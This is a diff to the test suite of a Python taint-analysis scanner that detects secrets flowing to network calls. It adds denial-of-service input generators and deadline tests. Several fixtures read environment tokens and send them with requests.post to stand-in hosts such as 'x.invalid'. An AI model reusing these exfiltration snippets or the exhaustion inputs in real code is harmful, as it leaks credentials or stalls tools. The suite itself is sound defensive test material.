     machine load, and unlike ``check_runtime`` calls it also counts loops that
-    never check the deadline.
+    never check the deadline. Jumps and branches are counted as well as lines,
+    so the iterations of a one-line comprehension or generator count too.
     """
     monitoring = sys.monitoring
     tool = next(candidate for candidate in (3, 4) if monitoring.get_tool(candidate) is None)
     count = [0]
+    events = (monitoring.events.LINE, monitoring.events.JUMP, monitoring.events.BRANCH)
 
-    def on_line(code_object: object, line: int) -> None:
+    def on_event(*_args: object) -> None:
         count[0] += 1
 
     monitoring.use_tool_id(tool, "taint-operation-count")
     codes = _analyzer_code_objects()
     try:
-        monitoring.register_callback(tool, monitoring.events.LINE, on_line)
+        for event in events:
+            monitoring.register_callback(tool, event, on_event)
         for code_object in codes:
-            monitoring.set_local_events(tool, code_object, monitoring.events.LINE)
+            monitoring.set_local_events(tool, code_object, sum(events))
         _run(code)
     finally:
         for code_object in codes:
             monitoring.set_local_events(tool, code_object, 0)
-        monitoring.register_callback(tool, monitoring.events.LINE, None)
+        for event in events:
+            monitoring.register_callback(tool, event, None)
         monitoring.free_tool_id(tool)
     return count[0]
 
@@ -2532,7 +3418,7 @@ def _every_source_in_many_locals(n: int) -> str:
 
 
 def _wide_assignment_in_nested_functions(n: int) -> str:
-    depth = 20
+    depth = max(2, min(n // 10, 90))  # nesting and width grow together
     lines = ["import os, sys, requests, httpx, urllib.request\n", f"s = {_ALL_SOURCES}\n"]
     lines += [" " * i + f"def f{i}(a{i}):\n" for i in range(depth)]
     lines.append(" " * depth + "x=" * n + "+".join(f"a{i}" for i in range(depth)) + "\n")
@@ -2549,7 +3435,7 @@ def _nested_in_file_calls(n: int) -> str:
     return "def f(a):\n    return a\nx = input()\n" + ("f(" * n + "x" + ")" * n + "\n") * 20
 
 
-def _deep_inheritance(n: int) -> str:
+def _wide_inheritance(n: int) -> str:
     out = []
     for c in range(n):
         out.append(f"def g{c}():\n")
@@ -2560,8 +3446,56 @@ def _deep_inheritance(n: int) -> str:
     return "".join(out)
 
 
+def _deep_inheritance(n: int) -> str:
+    """One inheritance chain whose depth grows with the file: the base lookup
+    must stay bounded (``_MAX_ANCESTORS``), not walk the whole chain."""
+    out = ["class K0:\n def m0(self, a):\n  return a\n"]
+    for i in range(1, 16 * n):
+        out.append(f"class K{i}(K{i - 1}):\n def m{i}(self, a):\n  self.m0(a)\n  return self.v\n")
+    return "".join(out)
+
+
 def _deep_scopes(n: int) -> str:
-    return "z = " + "lambda: " * n + "[" + ",".join(f"n{i}" for i in range(200)) + "]\n"
+    """Nesting depth and the number of names grow together."""
+    names = ",".join(f"n{i}" for i in range(50 * n))
+    return "z = " + "lambda: " * n + "[" + names + "]\n"
+
+
+def _chained_lambda(n: int) -> str:
+    """One lambda with n parameters bound to n names, each called."""
+    names = "=".join(f"a{i}" for i in range(n))
+    params = ",".join(f"p{i}" for i in range(n))
+    return f"q = {{}}\n{names} = lambda {params}: 0\n" + "".join(f"a{i}(**q)\n" for i in range(n))
+
+
+def _nested_lambda_defaults(n: int) -> str:
+    """Lambdas nested n deep through their defaults."""
+    expression = "0"
+    for _ in range(n):
+        expression = f"lambda a={expression}: 0"
+    return "".join(f"x{i} = {expression}\n" for i in range(4))
+
+
+def _forwarded_unpacking(n: int) -> str:
+    """Bound calls forwarding ``*args`` / ``**kwargs`` into wide signatures."""
+    params = ", ".join(f"p{i}" for i in range(n))
+    return (
+        f"class B:\n def __init__(self, {params}, *a, **k):\n  pass\n"
+        "class C(B):\n def __init__(self, *a, **k):\n"
+        + "".join(f"  super().__init__(*a, x{i}=1, **k)\n" for i in range(n))
+    )
+
+
+def _forwarded_keywords(n: int) -> str:
+    """Forwarded ``**kwargs`` whose callers pass many names: past the cap the
+    forwarding binds as one wildcard, not once per name."""
+    params = ",".join(f"p{i}=0" for i in range(n))
+    return (
+        f"class B:\n def __init__(self, {params}):\n  pass\n"
+        "class C(B):\n def __init__(self, **k):\n"
+        + "  super().__init__(**k)\n" * n
+        + "".join(f"C(p{i}=1)\n" for i in range(n))
+    )
 
 
 # Every denial-of-service repro from the two reviews of this change, scaled
@@ -2592,8 +3526,13 @@ _DOS_SHAPES = {
     "wide_assignment_in_nested_functions": (_wide_assignment_in_nested_functions, 200),
     "nested_callback_arguments": (_nested_callback_arguments, 15),
     "nested_in_file_calls": (_nested_in_file_calls, 15),
+    "wide_inheritance": (_wide_inheritance, 3),
     "deep_inheritance": (_deep_inheritance, 3),
     "deep_scopes": (_deep_scopes, 20),
+    "chained_lambda": (_chained_lambda, 150),
+    "nested_lambda_defaults": (_nested_lambda_defaults, 40),
+    "forwarded_unpacking": (_forwarded_unpacking, 100),
+    "forwarded_keywords": (_forwarded_keywords, 100),
 }
 
 
@@ -2685,6 +3624,73 @@ class TestAdversarialInputs:
             assert len(tainted) == count
             assert sum(len(f.message) for f in findings) <= 200 * len(findings)
 
+    @pytest.mark.parametrize(
+        ("setup", "read"),
+        [
+            pytest.param(
+                "class C:\n    def m(self):\n        self.{long} = os.getenv('K')\n"
+                "    def send(self):\n",
+                "self.{long}",
+                id="self_attribute",
+            ),
+            pytest.param(
+                "class C:\n    def m({long}):\n        {long}.a = os.getenv('K')\n",
+                "{long}.a",
+                id="receiver_attribute",
+            ),
+            pytest.param(
+                "def {long}():\n    return os.getenv('K')\ndef send():\n",
+                "{long}()",
+                id="call",
+            ),
+            pytest.param(
+                "class C:\n    def t(self):\n        return os.getenv('K')\n    def m({long}):\n",
+                "{long}.t()",
+                id="method_call",
+            ),
+            pytest.param(
+                "class {long}:\n    def t(self):\n        return os.getenv('K')\ndef send():\n",
+                "{long}().t()",
+                id="constructed_call",
+            ),
+        ],
+    )
+    def test_every_sink_spelling_is_shortened(self, setup: str, read: str) -> None:
+        """Attribute, call and method-call spellings at a sink are capped too."""
+        long = "q" * 1_000
+        sinks = 20
+        header = setup.format(long=long)
+        indent = " " * (len(header.splitlines()[-1]) - len(header.splitlines()[-1].lstrip()) + 4)
+        if not header.rstrip().endswith(":"):
+            indent = " " * 8
+        sink = f"{indent}requests.post('u', data={read.format(long=long)})\n"
+        findings = _run("import os, requests\n" + header + sink * sinks)
+        assert len(findings) == sinks
+        cap = behavioral_taint_tracking._MAX_NAME_CHARS
+        spelled = read.format(long=long).split(long)[0]
+        for finding in findings:
+            name = finding.message.split("'")[1]
+            assert len(name) <= cap and name.endswith("...")
+            assert name.startswith(spelled + "q")
+
+    def test_super_calls_are_spelled_as_written(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Base:
+                def tok(self):
+                    return os.getenv("TOKEN")  # RETURN
+            class Child(Base):
+                def send(self):
+                    requests.post("https://x.invalid", data=super().tok())
+            """
+        )
+        (finding,) = _run(code)
+        assert finding.message == (
+            f"Tainted flow: 'super().tok()' from os.getenv (line {_line(code, '# RETURN')}, "
+            "credential/environment) → requests.post (network output)"
+        )
+
     def test_identifiers_up_to_the_cap_are_reported_in_full(self) -> None:
         cap = behavioral_taint_tracking._MAX_NAME_CHARS
         for length, spelled in ((cap, "t" * cap), (cap + 1, "t" * (cap - 3) + "...")):
@@ -2700,9 +3706,7 @@ class TestAdversarialInputs:
 
         def facts(code: str) -> int:
             parsed = get_python_ast(None, code, "t.py")
-            index = behavioral_taint_tracking._build_scope_index(
-                parsed.tree, parsed.import_aliases, {}
-            )
+            index = behavioral_taint_tracking._build_scope_index(parsed.tree)
             graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
             graph.run()
             return sum(len(lane) for slot in graph.facts for lane in slot)
@@ -2723,20 +3727,21 @@ class TestAdversarialInputs:
 
         code = _wide_assignment_in_nested_functions(2000)
         parsed = get_python_ast(None, code, "t.py")
-        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
         graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
         graph.build()
         flows = len(graph.flows) + len(graph.seeds)
         monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
         _run(code)
         # Each flow fires at most once per (lane, source rank, bound or not):
-        # twelve times, however many sources the forwarded value carries and
-        # however deep it goes.
-        assert calls["n"] <= 12 * flows
+        # fourteen times (three ranks in lanes 0 and 1, one in lane 2, two
+        # slots), however many sources the forwarded value carries and however
+        # deep it goes.
+        assert calls["n"] <= 14 * flows
 
     def test_redefinitions_merge_into_one_class_and_one_callee(self) -> None:
         parsed = get_python_ast(None, _typed_redefinitions(500), "t.py")
-        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
         (cls,) = index.classes
         (group,) = cls.methods["m"].values()
         assert len(group.functions) == 500
@@ -2751,9 +3756,7 @@ class TestAdversarialInputs:
 
     def test_deadline_is_checked_while_indexing(self) -> None:
         def index(parsed, check):
-            behavioral_taint_tracking._build_scope_index(
-                parsed.tree, parsed.import_aliases, {}, check
-            )
+            behavioral_taint_tracking._build_scope_index(parsed.tree, check)
 
         stack = self._raised_in("x + 1\n" * 20000, 5000, index)
         assert "_build_scope_index" in stack
@@ -2765,7 +3768,7 @@ class TestAdversarialInputs:
     def test_deadline_is_checked_per_statement(self) -> None:
         """Calls that bind nothing still pass a deadline check each."""
         parsed = get_python_ast(None, "class C:\n    pass\n" + "C()\n" * 20000, "t.py")
-        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
         graph = behavioral_taint_tracking._TaintGraph(
             index, {}, parsed.import_aliases, _capped_check_runtime(5000)
         )
@@ -2777,7 +3780,7 @@ class TestAdversarialInputs:
         functions = "".join(f"def f{i}(a, b, *c, d=1, **e):\n    return a\n" for i in range(3000))
         calls = "".join(f"f{i}(1, 2, 3, d=4, e=5)\n" for i in range(3000))
         parsed = get_python_ast(None, functions + calls, "t.py")
-        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
         graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
         for node, scope in index.statements:
             if isinstance(node, behavioral_taint_tracking.ast.Call):
@@ -2794,9 +3797,136 @@ class TestAdversarialInputs:
             + 'a0 = os.getenv("K")\n'
         )
         parsed = get_python_ast(None, code, "t.py")
-        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
         graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
         graph.build()
         graph.tick = _capped_check_runtime(depth // 2)
         with pytest.raises(_RuntimeBudgetError):
             graph.propagate()
+
+    @pytest.mark.parametrize(
+        ("stage", "code", "limit"),
+        [
+            pytest.param(
+                "_resolve_names",
+                "x = (" + "lambda: 0, " * 3000 + ")\n",
+                1000,
+                id="resolve_per_scope",
+            ),
+            pytest.param(
+                # One check per scope and one per definition: 6,001 in all.
+                "_resolve_names",
+                "def f():\n    pass\n" * 3000,
+                4500,
+                id="resolve_per_definition",
+            ),
+            pytest.param(
+                "_index_definitions", "class C:\n    pass\n" * 3000, 1000, id="index_classes"
+            ),
+            pytest.param(
+                "_index_definitions",
+                "class D(" + ",".join(f"b{i}" for i in range(3000)) + "):\n    pass\n",
+                1000,
+                id="index_bases",
+            ),
+            pytest.param(
+                "_index_definitions",
+                "".join(f"def f{i}():\n    pass\n" for i in range(3000)),
+                1000,
+                id="index_functions",
+            ),
+            pytest.param(
+                "_index_definitions",
+                "=".join(f"a{i}" for i in range(3000)) + " = lambda: 0\n",
+                1000,
+                id="index_lambda_bindings",
+            ),
+            pytest.param(
+                "ancestors",
+                "class K0:\n    pass\n"
+                + "".join(f"class K{i}(K{i - 1}):\n    pass\n" for i in range(1, 3000))
+                + "class Leaf(K2999):\n    def go(self):\n        self.m()\n",
+                1000,
+                id="ancestors",
+            ),
+            pytest.param(
+                "scan", "x = [" + ",".join(f"n{i}" for i in range(3000)) + "]\n", 1000, id="scan"
+            ),
+            pytest.param(
+                # ``_mark_targets`` checks once per 1024 targets.
+                "_mark_targets",
+                "import os\n" + ",".join(f"t{i}" for i in range(40 * 1024)) + " = os.getenv('K')\n",
+                20,
+                id="mark_targets",
+            ),
+            pytest.param(
+                "defaults",
+                "def f(" + ",".join(f"a{i}=0" for i in range(3000)) + "):\n    pass\n",
+                1000,
+                id="defaults",
+            ),
+            pytest.param(
+                "link_attributes",
+                "class C:\n    def m(self):\n" + "        x = self.a\n" * 3000,
+                1000,
+                id="link_attribute_nodes",
+            ),
+            pytest.param(
+                # One check per attribute and one per distinct ``self.x``: 6,000.
+                "link_attributes",
+                "class C:\n    def m(self):\n"
+                + "".join(f"        x = self.a{i}\n" for i in range(3000)),
+                4500,
+                id="link_attribute_views",
+            ),
+            pytest.param(
+                # One check per class-body read and one per statement: 6,000.
+                "build",
+                "class C:\n" + "".join(f"    x{i} = x{i}\n" for i in range(3000)),
+                4500,
+                id="build_class_reads",
+            ),
+            pytest.param(
+                "build",
+                "".join(f"def f{i}(a=0):\n    pass\n" for i in range(3000)),
+                1000,
+                id="build_functions",
+            ),
+            pytest.param(
+                "propagate",
+                "import os\n"
+                + "".join(f"def f{i}():\n    return os.getenv('K')\n" for i in range(3000)),
+                1000,
+                id="propagate_seeds",
+            ),
+            pytest.param(
+                "_find_tainted_names_in_args",
+                "import requests\nrequests.post('u', data=["
+                + ",".join("x" for _ in range(3000))
+                + "])\n",
+                1000,
+                id="sink_arguments",
+            ),
+        ],
+    )
+    def test_deadline_is_checked_inside_each_stage(self, stage: str, code: str, limit: int) -> None:
+        """Each stage checks the deadline in its own loops, not only between stages.
+
+        The deadline here counts only the checks made by *stage* itself, and
+        each input makes one of its loops do most of the work, so the test
+        fails if that loop's check is removed.
+        """
+        calls = {"n": 0}
+
+        def check_runtime() -> None:
+            if sys._getframe(1).f_code.co_name == stage:
+                calls["n"] += 1
+                if calls["n"] > limit:
+                    raise _RuntimeBudgetError(stage)
+
+        budget = types.SimpleNamespace(
+            check_runtime=check_runtime, emit=lambda finding: None, current_findings=[]
+        )
+        parsed = get_python_ast(None, code, "t.py")
+        with pytest.raises(_RuntimeBudgetError, match=stage):
+            behavioral_taint_tracking._analyze_python(parsed, "t.py", budget)
